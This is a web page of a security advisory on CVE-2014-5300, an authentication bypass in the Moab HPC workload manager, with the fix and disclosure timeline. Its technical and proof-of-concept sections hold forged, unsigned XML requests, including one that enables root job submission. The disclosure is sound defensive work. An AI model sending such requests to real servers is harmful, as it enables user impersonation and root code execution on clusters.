<!DOCTYPE html>
<html lang="en-US">
<head>
    <base href="https://labs.f-secure.com/"><!--[if lte IE 6]></base><![endif]-->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta http-equiv="Content-type" content="text/html; charset=utf-8" />
<meta name="x-subsite-id" content="1" />

    <title>Moab Authentication Bypass [CVE-2014-5300]</title>

    <link rel="stylesheet" href="https://labs.f-secure.com/themes/mwr/css/style.css?t=20200715">
    <link rel="stylesheet" href="https://labs.f-secure.com/themes/labs/css/style.css?t=20200715">

    <meta name="description" content="">
    <link rel="canonical" href="https://labs.f-secure.com/advisories/moab-authentication-bypass-cve-2014-5300/">
    <meta name="robots" content="NOODP,index,follow">

    

    <link rel="icon" href="favicon.ico" type="image/x-icon">
    <link rel="shortcut icon" href="favicon.ico" type="image/x-icon">

    <meta name="format-detection" content="telephone=no">
    
    <meta property="og:title" content="">
    <meta property="og:description" content="">
    <meta property="og:type" content="website">
    <meta property="og:site_name" content="F-Secure Labs">
    <meta property="og:url" content="https://labs.f-secure.com/advisories/moab-authentication-bypass-cve-2014-5300/">
    
    <meta property="og:locale" content='en_GB'>
    <meta name="twitter:card" content="summary">
    
    <meta name="twitter:title" content="">
    <meta name="twitter:description" content="">

  <script>
    (function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start': new Date().getTime(),event:'gtm.js'});
    var f=d.getElementsByTagName(s)[0],j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;
    j.src='https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);})
    (window,document,'script','dataLayer','GTM-KD9T85H');
  </script>
  <meta name="google-site-verification" content="jqRTM8I_uI-jDIu1ITng14jD-3iJy0l3TTCIl2I-BIo" />
<link rel="stylesheet" type="text/css" href="/themes/labs/css/style.css?m=1600760392" />
</head>
<body class="BlogPost" dir="ltr">

    <header class="head menu-opened" id="top">
	<div class="container">
		<div class="col12">
			<div class="logo">
				<a href="/">F-Secure</a>
			</div>
		    <a href="/advisories/moab-authentication-bypass-cve-2014-5300/#nav" class="btn-menu">Menu</a>

<nav class="main-nav" itemscope itemtype="https://schema.org/SiteNavigationElement">
    <ul>
        
            <li class="section nav-advisories"><a href="/advisories/" title="Advisories">Advisories</a></li>
        
            <li class="link nav-blog"><a href="/blog/" title="/var/log/messages">/var/log/messages</a></li>
        
            <li class="link nav-publications"><a href="/publications/" title="Publications">Publications</a></li>
        
            <li class="link nav-tools"><a href="/tools/" title="Tools">Tools</a></li>
        
            <li class="link nav-archive"><a href="/archive/" title="Archive">Archive</a></li>
        
        <li class="nav-careers"><a href="https://www.f-secure.com/en/web/about_global/careers/job-openings">Careers</a></li>
    </ul>
</nav>

		</div>
	</div>
</header>


    <div class="wrapper">

        <section class="section">
  <div class="page-title">
    <div class="container">
      <span class="content-type"></span>
      <h1>Moab Authentication Bypass [CVE-2014-5300]</h1>
      
      
    </div>
  </div>
</section>

<section class="section">
  <div class="container">
    <div class="col8">
      <div class="blog-post">
        
        <table>
          <tr>
            <td>Product</td>
            <td>Moab</td>
          </tr>
          <tr>
            <td>Severity</td>
            <td>High</td>
          </tr>
          <tr>
            <td>CVE Reference</td>
            <td>CVE-2014-5300</td>
          </tr>
          <tr>
            <td>Type</td>
            <td>Moab Authentication Bypass</td>
          </tr>
        </table>
        
        <p>It is possible to bypass authentication within Moab in order to impersonate and run commands/operations as arbitrary users. The issue is believed to affect all versions of Moab prior to versions 7.2.9 and Moab 8.</p>
<dl><dt>Software</dt><dd>Moab</dd><dt>Affected Versions</dt><dd>All versions prior to Moab 7.2.9 and Moab 8</dd><dt><span class="caps">CVE</span> Reference</dt><dd><span class="caps">CVE</span>-2014-5300</dd><dt>Authors</dt><dd>John Fitzpatrick</dd><dt>Severity</dt><dd>High Risk</dd><dt>Vendor</dt><dd>Adaptive Computing</dd><dt>Vendor Response</dt><dd>Resolved in Moab 7.2.9 and Moab 8</dd></dl><h3>Description</h3>
<p>It is possible to bypass authentication within Moab in order to impersonate and run commands/operations as arbitrary users. The issue is believed to affect all versions of Moab prior to versions 7.2.9 and Moab 8.</p>
<h3>Impact</h3>
<p>Successful exploitation could lead to remote code execution.</p>
<h3>Cause</h3>
<p>The Moab server does not appropriately authenticate requests.</p>
<h3>Solution</h3>
<p>Upgrade to Moab 7.2.9, Moab 8, or a later version of the software. Beta versions of Moab 8 are affected by this issue. This issue also affects versions of Moab which are using Munge for authentication.</p>
<p>This issue is believed to affect all instances of Moab prior to version 7.2.9 and 8. <span class="caps">MWR</span> are not aware of any alternate workaround for this issue.</p>
<h3>Technical Details</h3>
<p>Moab is a workload manager used in High Performance Computing (<span class="caps">HPC</span>) environments. In a typical environment a user submits their jobs to the Moab server for it to handle the workload. This communication makes use of an <span class="caps">XML</span> based protocol, and example job submission is shown below:</p>
<pre>&lt;Envelope component="ClusterScheduler" count="1" name="moab" type="nonblocking" version="8.0.beta.2"&gt;
  &lt;Signature&gt;
    &lt;DigestValue&gt;7v49VzAlbyNQ4O3VChCus+v2LeE=&lt;/DigestValue&gt;
    &lt;SignatureValue&gt;QG13cmxhYnMgRWFzdGVyIEVnZyE=&lt;/SignatureValue&gt;
  &lt;/Signature&gt;
  &lt;Body actor="test" timestamp="1408488412"&gt;
    &lt;Request action="submit" actor="test" cmdline="\STARTmsub"&gt;
      &lt;Object&gt;job&lt;/Object&gt;
      &lt;job&gt;
        &lt;Owner&gt;test&lt;/Owner&gt;
        &lt;UserId&gt;test&lt;/UserId&gt;
        &lt;GroupId&gt;test&lt;/GroupId&gt;
        &lt;InitialWorkingDirectory&gt;/home/test&lt;/InitialWorkingDirectory&gt;
        &lt;UMask&gt;2&lt;/UMask&gt;
        &lt;Executable&gt;/usr/bin/id&lt;/Executable&gt;
        &lt;SubmitLanguage&gt;PBS&lt;/SubmitLanguage&gt;
        &lt;SubmitString&gt;\START/usr/bin/id\0a\0a&lt;/SubmitString&gt;
      &lt;/job&gt;
    &lt;/Request&gt;
  &lt;/Body&gt;
&lt;/Envelope&gt;</pre>
<p>Contained within this message is a &lt;Signature&gt; element, which contains both a &lt;DigestValue&gt; and &lt;SignatureValue&gt; elements. The &lt;DigestValue&gt; is simply a SHA1 sum of the &lt;Body&gt; element. The &lt;SignatureValue&gt;, however, is computed based upon a key (.moab.key) which is read by a setuid root binary (mauth) which performs some additional verification of the user before providing a signature for the message. This use of signatures is intended to prevent users from being able to craft arbitrary messages as the signature value is validated by the Moab server. Messages containing an incorrect signature for the message will be rejected.</p>
<p>However, whilst an incorrect SignatureValue results in a rejected message, it was found that if no signature is supplied then the signature checks are skipped and the remainder of the message processed. As a result it is possible to craft arbitrary messages and these messages will be accepted and honoured by the server as long as the message does not include a &lt;Signature&gt; element.</p>
<p>The following message contains no signature element and therefore will be accepted by the server:</p>
<pre>&lt;Envelope component="ClusterScheduler" count="1" name="moab" type="nonblocking" version="8.0.beta.2"&gt;
  &lt;Body actor="test" timestamp="1408488412"&gt;
    &lt;Request action="submit" actor="test" cmdline="\STARTmsub"&gt;
      &lt;Object&gt;job&lt;/Object&gt;
      &lt;job&gt;
        &lt;Owner&gt;test&lt;/Owner&gt;
        &lt;UserId&gt;test&lt;/UserId&gt;
        &lt;GroupId&gt;test&lt;/GroupId&gt;
        &lt;InitialWorkingDirectory&gt;/home/test&lt;/InitialWorkingDirectory&gt;
        &lt;UMask&gt;2&lt;/UMask&gt;

        &lt;Executable&gt;/usr/bin/id&lt;/Executable&gt;
        &lt;SubmitLanguage&gt;PBS&lt;/SubmitLanguage&gt;
        &lt;SubmitString&gt;\START/usr/bin/id\0a\0a&lt;/SubmitString&gt;
      &lt;/job&gt;
    &lt;/Request&gt;
  &lt;/Body&gt;
&lt;/Envelope&gt;</pre>
<p>With no signing taking place an adversary can specify arbitrary users for these operations to be performed under, and thus impersonate other users including executing jobs as other users.</p>
<h3>Proof of Concept</h3>
<p>In addition to job submission Moab also provides the ability to dynamically reconfigure the Moab server remotely. Whilst a default Moab installation will not permit the submission of root jobs it is possible to exploit this vulnerability in order to dynamically reconfigure Moab to allow root job submissions. The following request achieves this and due to its simple nature makes a useful proof of concept (the timestamp value may require altering):</p>
<pre>00000238
&lt;Envelope component="ClusterScheduler" count="1" name="moab" version="8.0.beta.2"&gt;&lt;Body actor="root" timestamp="1404856164"&gt;&lt;Request action="modify" actor="root" args="ALLOWROOTJOBS TRUE"&gt;&lt;Object&gt;sched&lt;/Object&gt;&lt;/Request&gt;&lt;/Body&gt;&lt;/Envelope&gt;</pre>
<p>Sending the entire message above (including the size value) will enable root jobs on a vulnerable server.</p>
<h3>Detailed Timeline</h3>
<table><tbody><tr><td>Date</td>
<td>Summary</td>
</tr><tr><td>2014-07-08</td>
<td>Vulnerability identified and detailed information passed to Adaptive</td>
</tr><tr><td>2014-07-09</td>
<td>Adaptive inform <span class="caps">MWR</span> that code changes are being made to address the issue</td>
</tr><tr><td>2014-07-11</td>
<td>Adaptive inform <span class="caps">MWR</span> that regression testing has identified an additional issue</td>
</tr><tr><td>2014-07-14</td>
<td>Moab 8 released</td>
</tr><tr><td>2014-08-20</td>
<td>Limited status update provided by Adaptive suggesting a 7.2 fix will emerge</td>
</tr><tr><td>2014-09-08</td>
<td>Release of advisory to <span class="caps">HPC</span> community</td>
</tr><tr><td>2014-09-16</td>
<td>Moab 7.2.9 released</td>
</tr><tr><td>2014-09-25</td>
<td>Public release of advisory</td>
</tr></tbody></table><p>http://labs.mwrinfosecurity.com</p>
      </div>
      <div class="social-share">
        <p><span class="content-type">Share</span></p>
        <ul class="social">
  <li class="facebook"><a href="http://www.facebook.com/sharer.php?u=https://labs.f-secure.com/advisories/moab-authentication-bypass-cve-2014-5300/" target="_blank">Share on Facebook</a></li>
  <li class="twitter"><a href="https://twitter.com/share?url=https://labs.f-secure.com/advisories/moab-authentication-bypass-cve-2014-5300/&text=Moab Authentication Bypass [CVE-2014-5300]" target="_blank">Share on LinkedIn</a></li>
  <li class="linkedin"><a href="http://www.linkedin.com/shareArticle?url=https://labs.f-secure.com/advisories/moab-authentication-bypass-cve-2014-5300/&title=Moab Authentication Bypass [CVE-2014-5300]" target="_blank">Share on Twitter</a></li>
</ul>

      </div>
    </div>
    <div class="col4">
      
      <a href="/assets/736/original/mwri_moab-authentication-bypass-CVE-2014-5300_2014-09-25.pdf" class="flex-container__box">
            <span class="content-type">Download</span>
            
            <h3 class="flex-container__box-title">Download the advisory here.</h3>
            
      </a>
      

      
    </div>
  </section>

  <section class="section">
    <div class="container">
      <div class="col12">
        <p>&nbsp;</p>
      </div>
    </div>
  </section>


    </div>

    <footer class="foot">
	<div class="container">
    <div class="footer-flex-wrap">
     <p class="logo"><img src="https://labs.f-secure.com//themes/labs/img/fs-labs-logo-white.svg" alt="F-Secure" width="180" height="60"></p>
      <ul class="top-menu">
        <li><a href="/advisories/moab-authentication-bypass-cve-2014-5300/#top" class="btn-gototop">Top</a></li>
        
        <li class="link"><a href="https://www.f-secure.com/en/consulting/contact">Contact</a></li>
        
        
      </ul>
   </div>
   <hr/>
    <div class="col5 suf1 foot-about">
      <p>F-Secure provides specialist advice and solutions in all areas of cyber security, from professional and managed services, through to developing commercial and open source security tools.  </p>
    </div>
    <div class="col3">
      <ul class="footer-list no-margin">
        
        <li><a href="/publications/ti-report-lazarus-group-cryptocurrency-vertical/">Threat Intelligence Report: Lazarus Group Campaign Targeting the Cryptocurrency Vertical</a></li>
        
        <li><a href="/publications/the-fake-cisco/">The Fake Cisco</a></li>
        
        <li><a href="/publications/u-booting-securely/">U-Booting securely</a></li>
        
      </ul>
    </div>
    <div class="col3">
     <ul class="footer-list">
      
      <li><a href="/blog/prelude-to-ransomware-systembc/">Prelude to Ransomware: SystemBC</a></li>
      
      <li><a href="/blog/attack-detection-fundamentals-2021-azure-lab-3/">Attack Detection Fundamentals 2021: Azure - Lab #3</a></li>
      
      <li><a href="/blog/attack-detection-fundamentals-2021-azure-lab-2/">Attack Detection Fundamentals 2021: Azure - Lab #2</a></li>
      
    </ul>
  </div>
</div>
<div class="end">
 <div class="container">
  <hr/>
  <div class="footer-flex-wrap">
   <p class="copyright">Copyright &copy; 2021 F-Secure</p>
    <ul class="social">
      
      <li class="linkedin for-footer"><a href="https://www.linkedin.com/showcase/28493188" target="_blank">Connect with us on LinkedIn</a></li>
      
      
      <li class="twitter for-footer"><a href="https://twitter.com/fsecurelabs" target="_blank">Follow us on Twitter</a></li>
      
      
      <li class="github for-footer"><a href="https://github.com/fsecurelabs" target="_blank">Follow us on GitHub</a></li>
      
    </ul>
 </div>
</div>
</div>
</footer>

    <script src="/themes/mwr/js/min/jquery-3.5.1.min.js" id="jqueryscript"></script>

    
    <script src="/themes/mwr/js/min/slides.min.js"></script>
    

    <script src="/themes/mwr/js/min/scripts.js?20190917" id="pagescripts"></script>

    <script type="application/ld+json">
    { "@context" : "http://schema.org",
      "@type" : "Organization",
      "name" : "F-Secure Labs",
      "url" : "https://labs.f-secure.com",
      "logo" : "https://labs.f-secure.com/themes/labs/img/fs-labs-logo-white.svg",
      "sameAs" : [
          "https://twitter.com/fsecurelabs",
          "https://www.linkedin.com/showcase/28493188"],
      "contactPoint" : [
        { "@type" : "ContactPoint",
          "telephone" : "+441256300920",
          "contactType" : "customer service"
        } ]
    }
    </script>
</body>
</html>
